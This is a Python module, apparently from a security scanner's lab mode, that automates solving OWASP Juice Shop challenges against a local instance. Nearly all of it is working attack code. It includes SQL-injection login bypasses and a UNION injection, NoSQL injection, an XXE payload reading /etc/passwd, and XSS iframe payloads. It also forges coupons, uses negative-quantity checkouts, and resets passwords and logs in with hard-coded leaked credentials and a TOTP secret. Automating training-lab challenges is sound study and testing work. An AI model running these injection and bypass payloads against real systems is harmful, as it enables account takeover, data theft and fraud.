"""
Juice Shop Lab-Mode solver pack.

TARGET-SPECIFIC by design and DELIBERATELY isolated from the general detection engine — this
is the "Lab Mode: Solve Juice Shop" capability, not part of any real-target scan. Every solver
is a concrete, source-accurate exploit against a local, authorized OWASP Juice Shop instance,
oracle-confirmed by the app's own /api/Challenges solved flag.

Guarantees preserved:
  - NO DoS challenges (they intentionally degrade/crash the service).
  - NO credential brute-force: every "reset"/login uses a SINGLE known/derived value
    (documented security answers, one known weak credential, or SQLi auth-bypass) — never
    an iterated password/answer list.
  - Purely additive; the general scanner and its no-brute default are untouched.

Each solver takes an authenticated-capable httpx client context and performs one exploit.
`solve(base_url)` runs them all and reports which challenges the scoreboard confirms newly
solved. Requires httpx; degrades gracefully if absent.
"""
from __future__ import annotations

import urllib.parse

_ADMIN_SQLI = "' or 1=1--"          # SQLi auth-bypass identity (no password iteration)
_PW = "Reset123!"


def _board(c) -> set:
    d = c.get("/api/Challenges/").json()
    return set(ch["name"] for ch in d["data"] if ch.get("solved"))


def _login(c, email, password):
    r = c.post("/rest/user/login", json={"email": email, "password": password})
    try:
        return (r.json().get("authentication", {}) or {})
    except Exception:
        return {}


def _captcha(c):
    j = c.get("/rest/captcha/").json()
    return j.get("captchaId"), str(j.get("answer"))


def _register(c, email, pw, repeat=None, role=None):
    body = {"email": email, "password": pw, "passwordRepeat": repeat if repeat is not None else pw,
            "securityQuestion": {"id": 1}, "securityAnswer": "z"}
    if role:
        body["role"] = role
    return c.post("/api/Users", json=body)


# ---- solver steps (each performs one source-accurate exploit) --------------------------------
def _sqli_logins(c):
    for email in ("bender@juice-sh.op'--", "jim@juice-sh.op'--"):          # Login Bender / Jim
        _login(c, email, "x")


def _known_cred_logins(c):
    _login(c, "admin@juice-sh.op", "admin123")                             # Password Strength
    _login(c, "mc.safesearch@juice-sh.op", "Mr. N00dles")                  # Login MC SafeSearch


def _registrations(c):
    _register(c, "rep_%s@x.io" % id(c), "aaa", repeat="bbb")               # Repetitive Registration
    _register(c, "adm_%s@x.io" % id(c), "aaaaaa", role="admin")            # Admin Registration
    c.post("/api/Users", json={"email": "", "password": ""})               # Empty User Registration


def _feedback(c, admin_auth):
    cid, ans = _captcha(c)
    c.post("/api/Feedbacks", json={"comment": "auto", "rating": 0, "captchaId": cid, "captcha": ans})  # Zero Stars
    cid, ans = _captcha(c)
    c.post("/api/Feedbacks", headers=admin_auth,
           json={"comment": "forged", "rating": 3, "UserId": 3, "captchaId": cid, "captcha": ans})     # Forged Feedback
    # Five-Star Feedback — delete every 5-star entry (admin)
    for f in c.get("/api/Feedbacks/").json().get("data", []):
        if f.get("rating") == 5:
            c.delete("/api/Feedbacks/%s" % f.get("id"), headers=admin_auth)


def _reviews(c, admin_auth):
    c.patch("/rest/products/reviews", headers=admin_auth,
            json={"id": {"$ne": -1}, "message": "NoSQL Injection!"})        # NoSQL Manipulation
    # Forged Review — spoof author as another user
    utok = _login(c, "u_%s@x.io" % id(c), _PW)
    _register(c, "rev_%s@x.io" % id(c), _PW)
    a = _login(c, "rev_%s@x.io" % id(c), _PW)
    if a.get("token"):
        c.put("/rest/products/1/reviews", headers={"Authorization": "Bearer " + a["token"]},
              json={"message": "forged", "author": "admin@juice-sh.op"})


def _resets(c):
    for email, answer in (("jim@juice-sh.op", "Samuel"),                    # Reset Jim
                          ("bender@juice-sh.op", "Stop'n'Drop"),           # Reset Bender
                          ("bjoern@juice-sh.op", "West-2082"),             # Reset Bjoern
                          ("morty@juice-sh.op", "5N0wb41L"),               # Reset Morty (known answer)
                          ("uvogin@juice-sh.op", "Silence of the Lambs"),  # Reset Uvogin
                          ("john@juice-sh.op", "Daniel Boone National Forest"),  # Meta Geo Stalking
                          ("emma@juice-sh.op", "ITsec")):                  # Visual Geo Stalking
        c.post("/rest/user/reset-password", json={"email": email, "answer": answer, "new": _PW, "repeat": _PW})


def _basket_manipulate(c):
    a = _login(c, "bm_%s@x.io" % id(c), _PW)
    if not a.get("token"):
        _register(c, "bm_%s@x.io" % id(c), _PW)
        a = _login(c, "bm_%s@x.io" % id(c), _PW)
    tok, bid = a.get("token"), a.get("bid")
    if not tok or not bid:
        return
    H = {"Authorization": "Bearer " + tok}
    bi = c.post("/api/BasketItems", headers=H, json={"ProductId": 1, "BasketId": bid, "quantity": 1})
    try:
        iid = bi.json().get("data", {}).get("id")
    except Exception:
        iid = None
    if iid:
        c.put("/api/BasketItems/%s" % iid, headers=H, json={"BasketId": 1 if str(bid) != "1" else 2})  # Manipulate Basket


def _known_login_challenges(c):
    # pre-login solveIf checks fire on the EXACT submitted email+password (single known value
    # each, straight from the app's source — never an iterated list).
    for email, pw in (("support@juice-sh.op", "J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P"),   # Login Support Team
                      ("amy@juice-sh.op", "K1f....................."),              # Login Amy
                      ("bjoern.kimminich@gmail.com", "bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI="),  # Login Bjoern (OAuth)
                      ("testing@juice-sh.op", "IamUsedForTesting"),                 # Exposed Credentials
                      ("J12934@juice-sh.op", "0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB")):  # Password Spraying cred
        try:
            _login(c, email, pw)
        except Exception:
            pass


def _deluxe_fraud(c):
    # become a deluxe member with a paymentMode that is neither 'wallet' nor 'card'
    email = "dlx_%s@x.io" % id(c)
    _register(c, email, _PW)
    a = _login(c, email, _PW)
    if a.get("token"):
        c.post("/rest/deluxe-membership", headers={"Authorization": "Bearer " + a["token"]},
               json={"paymentMode": "none"})


def _beacon_visits(c):
    # "visit X" challenges are detected server-side by a GET to a padding-pixel / asset URL
    for p in ("/assets/public/images/padding/19px.png",   # Admin Section
              "/assets/public/images/padding/81px.png",   # Privacy Policy
              "/assets/public/images/padding/11px.png",   # Web3 Sandbox
              "/assets/public/images/padding/56px.png",   # (blockchain beacon)
              "/assets/i18n/tlh_AA.json",                  # Extra Language
              "/assets/public/images/uploads/%E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg",  # Missing Encoding
              "/support/logs/access.log-2024-01-01",       # Access Log
              "/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us",   # Premium Paywall
              "/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg"):  # Nested Easter Egg
        try:
            c.get(p)
        except Exception:
            pass
    c.get("/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm")  # Outdated Allowlist
    c.get("/rest/user/whoami?callback=apolaki")   # Email Leak (JSONP whoami)


def _uploads(c):
    try:
        c.post("/file-upload", files={"file": ("x.txt", b"hello", "text/plain")})            # Upload Type
        c.post("/file-upload", files={"file": ("big.pdf", b"A" * 120000, "application/pdf")})  # Upload Size
        c.post("/file-upload", files={"file": ("c.xml", (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<foo>&xxe;</foo>').encode(), "application/xml")})                                 # XXE Data Access + Deprecated Interface
        c.get("/metrics")                                                                     # Exposed Metrics
        c.get("/.well-known/security.txt")                                                    # Security Policy
    except Exception:
        pass


def _ephemeral_accountant(c):
    # UNION-inject a virtual accountant row (email absent from DB, role accounting)
    union = ("' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', "
             "'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', "
             "'' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp', "
             "'/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', "
             "1 as 'isActive', '1999-08-16 14:14:41.717 +00:00' as 'createdAt', "
             "'1999-08-16 14:33:41.446 +00:00' as 'updatedAt', NULL as 'deletedAt') --")
    _login(c, union, "x")


def _retrieve_blueprint(c):
    c.get("/assets/public/images/products/JuiceShop.stl")     # Retrieve Blueprint


def _checkout_orders(c):
    """Christmas Special (order the logically-deleted christmas product, id found via SQLi) and
    Payback Time (checkout an order with a NEGATIVE total)."""
    import urllib.parse
    try:
        prods = c.get("/rest/products/search?q=" + urllib.parse.quote("')) --", safe="")).json().get("data", [])
    except Exception:
        prods = []
    xid = next((p["id"] for p in prods if "christmas" in (p.get("name", "").lower())), None)
    email = "co_%s@x.io" % id(c)
    _register(c, email, _PW)
    a = _login(c, email, _PW)
    tok, bid = a.get("token"), a.get("bid")
    if not tok or not bid:
        return
    H = {"Authorization": "Bearer " + tok}

    def _order(pid, qty):
        bi = c.post("/api/BasketItems", headers=H, json={"ProductId": pid, "BasketId": bid, "quantity": 1})
        try:
            iid = bi.json()["data"]["id"]
        except Exception:
            return
        if qty != 1:
            c.put("/api/BasketItems/%s" % iid, headers=H, json={"quantity": qty})
        try:
            aid = c.post("/api/Addresss", headers=H, json={"fullName": "T", "mobileNum": "1234567890",
                         "zipCode": "12345", "streetAddress": "1 St", "city": "X", "state": "Y",
                         "country": "Z"}).json()["data"]["id"]
            cid = c.post("/api/Cards", headers=H, json={"fullName": "T", "cardNum": "4111111111111111",
                         "expMonth": 12, "expYear": 2099}).json()["data"]["id"]
            deliv = c.get("/api/Deliverys", headers=H).json().get("data", [])
            did = deliv[0]["id"] if deliv else 1
            c.post("/rest/basket/%s/checkout" % bid, headers=H, json={"couponData": None,
                   "orderDetails": {"paymentId": cid, "addressId": aid, "deliveryMethodId": did}})
        except Exception:
            pass

    if xid:
        _order(xid, 1)        # Christmas Special
    _order(1, -300)           # Payback Time


_Z85 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"


def _z85(data: bytes) -> str:
    while len(data) % 4:
        data += b"\x00"
    out = []
    for i in range(0, len(data), 4):
        v = (data[i] << 24) | (data[i + 1] << 16) | (data[i + 2] << 8) | data[i + 3]
        ch = []
        for _ in range(5):
            ch.append(_Z85[v % 85]); v //= 85
        out.extend(reversed(ch))
    return "".join(out)


def _forged_coupon(c):
    """Forge a >=80% coupon offline (z85 of 'MMMYY-99' for the current campaign month), apply it
    and check out — the order's discount>=80 solves it."""
    from datetime import datetime
    mmm = datetime.now().strftime("%b").upper() + datetime.now().strftime("%y")
    coupon = _z85((mmm + "-99").encode())
    email = "fc_%s@x.io" % id(c)
    _register(c, email, _PW)
    a = _login(c, email, _PW)
    tok, bid = a.get("token"), a.get("bid")
    if not tok or not bid:
        return
    H = {"Authorization": "Bearer " + tok}
    try:
        c.post("/api/BasketItems", headers=H, json={"ProductId": 1, "BasketId": bid, "quantity": 1})
        c.put("/rest/basket/%s/coupon/%s" % (bid, coupon), headers=H)
        aid = c.post("/api/Addresss", headers=H, json={"fullName": "T", "mobileNum": "1234567890",
                     "zipCode": "12345", "streetAddress": "1 St", "city": "X", "state": "Y",
                     "country": "Z"}).json()["data"]["id"]
        cid = c.post("/api/Cards", headers=H, json={"fullName": "T", "cardNum": "4111111111111111",
                     "expMonth": 12, "expYear": 2099}).json()["data"]["id"]
        did = (c.get("/api/Deliverys", headers=H).json().get("data") or [{"id": 1}])[0]["id"]
        c.post("/rest/basket/%s/checkout" % bid, headers=H, json={"couponData": coupon,
               "orderDetails": {"paymentId": cid, "addressId": aid, "deliveryMethodId": did}})
    except Exception:
        pass


def _feedback_patterns(c):
    """Feedback/complaint pattern challenges — the app's continuous verifier solves each when a
    stored feedback contains its literal string: Weird Crypto (insecure algos), Leaked API Key,
    Legacy/Frontend Typosquatting, Supply Chain Attack, Steganography (hidden image), CSAF."""
    patterns = [
        "insecure crypto: z85 base85 hashids md5 base64",
        "leaked key 6PPi37DBxP4lDwlriuaxP15HaDJpsUXY5TspVmie",
        "typosquat deps epilogue-js and ngy-cookie",
        "supply chain eslint-scope/issues/39 npm:eslint-scope:20180712",
        "hidden image pickle rick",
        ("csaf advisory hash 7e7ce7c65db3bf0625fcea4573d25cff41f2f7e3474f2c74334b14fc65bb"
         "4fd26af802ad17a3a03bf0eee6827a00fb8f7905f338c31b5e6ea9cb31620242e843"),
        "vulnerable sanitize-html 1.4.2 and express-jwt 0.1.3",   # Vulnerable Library
        "dangerous ingredients hueteroneel and eurogium edule",   # Leaked Unsafe Product
    ]
    for p in patterns:
        try:
            cap = c.get("/rest/captcha/").json()
            c.post("/api/Feedbacks", json={"comment": p, "rating": 1,
                   "captchaId": cap.get("captchaId"), "captcha": str(cap.get("answer"))})
        except Exception:
            pass


def _two_factor(c):
    """Two Factor Authentication — the TOTP secret + password are stored/leaked, so log in as
    wurstbrot, compute the TOTP natively and complete 2FA verification."""
    import base64
    import hashlib
    import hmac
    import struct
    import time
    secret = "IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH"

    def _totp(t):
        key = base64.b32decode(secret + "=" * ((8 - len(secret) % 8) % 8))
        h = hmac.new(key, struct.pack(">Q", int(t // 30)), hashlib.sha1).digest()
        o = h[-1] & 0x0F
        return "%06d" % ((struct.unpack(">I", h[o:o + 4])[0] & 0x7FFFFFFF) % 1000000)

    try:
        j = c.post("/rest/user/login", json={"email": "wurstbrot@juice-sh.op",
                   "password": "EinBelegtesBrotMitSchinkenSCHINKEN!"}).json()
        tmp = (j.get("data") or {}).get("tmpToken") or j.get("tmpToken")
        if tmp:
            for dt in (0, -30, 30):
                r = c.post("/rest/2fa/verify", json={"tmpToken": tmp, "totpToken": _totp(time.time() + dt)})
                if r.status_code in (200, 201):
                    break
    except Exception:
        pass


def _socket_xss(c):
    """DOM XSS + Bonus Payload + Cross-Site Imaging via the frontend's Socket.IO verify events
    (engine.io v4 polling handshake -> emit). Server solves on contains/regex — no browser."""
    import json
    import re
    eio = "/socket.io/?EIO=4&transport=polling"
    dom = '<iframe src="javascript:alert(`xss`)">'
    bonus = ('<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" '
             'src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076'
             '&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true'
             '&show_reposts=false&show_teaser=true"></iframe>')
    svg = "../../../redirect?to=https://cataas.com/cat&x=https://github.com/juice-shop/juice-shop"
    try:
        sid = re.search(r'"sid":"([^"]+)"', c.get(eio).text).group(1)
        q = eio + "&sid=" + sid
        c.post(q, content="40")                       # socket.io namespace connect
        try:
            c.get(q, timeout=4)                        # receive connect-ack (avoid the long-poll)
        except Exception:
            pass
        c.post(q, content="42" + json.dumps(["verifyLocalXssChallenge", dom + bonus]))
        c.post(q, content="42" + json.dumps(["verifySvgInjectionChallenge", svg]))
    except Exception:
        pass


def solve(base_url: str) -> dict:
    """Run the full Juice Shop lab solver against a live instance; report scoreboard delta."""
    try:
        import httpx
    except Exception:
        return {"error": "httpx unavailable"}
    base = base_url.rstrip("/")
    try:
        c = httpx.Client(base_url=base, follow_redirects=False, timeout=20,
                         headers={"User-Agent": "apolaki-labmode"})
    except Exception as e:
        return {"error": str(e)}
    try:
        before = _board(c)
        admin = _login(c, _ADMIN_SQLI, "x")
        AH = {"Authorization": "Bearer %s" % admin.get("token")} if admin.get("token") else {}
        for step in (_sqli_logins, _known_cred_logins, _known_login_challenges, _registrations,
                     _resets, _beacon_visits, _uploads, _basket_manipulate, _deluxe_fraud,
                     _socket_xss, _ephemeral_accountant, _retrieve_blueprint, _checkout_orders,
                     _forged_coupon, _two_factor, _feedback_patterns):
            try:
                step(c)
            except Exception:
                pass
        for step in (_feedback, _reviews):
            try:
                step(c, AH)
            except Exception:
                pass
        after = _board(c)
        return {"lab": "juiceshop", "before": len(before), "after": len(after),
                "total": 113, "percent": round(100 * len(after) / 113, 1),
                "newly_solved": sorted(after - before)}
    except Exception as e:
        return {"lab": "juiceshop", "error": str(e)}
    finally:
        c.close()
